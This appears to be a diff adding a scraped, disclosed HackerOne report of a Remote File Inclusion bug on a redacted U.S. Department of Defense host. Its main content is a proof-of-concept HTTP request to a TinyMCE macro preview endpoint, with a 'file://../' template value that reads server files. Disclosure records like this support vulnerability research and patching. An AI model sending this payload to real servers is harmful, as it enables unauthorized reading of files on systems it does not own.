@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/538771
+WeaknessName:Remote File Inclusion
+Reporter:https://hackerone.com/nahamsec
+ReportedTo:U.S. Dept Of Defense(deptofdefense)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:04.10.2019 15:17:21
+
+Summary:
+
+#POC
+
+```
+POST /rest/tinymce/1/macro/preview HTTP/1.1
+Host: ██████
+Content-Type: application/json
+Content-Length: 174
+
+{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"https://www.youtube.com/watch?v=wHEHYJpCkpg","width":"300","height":"200","_template":"file://../"}}}
+```
+
+Thanks,
+Ben
+
+## Impact
+
+#
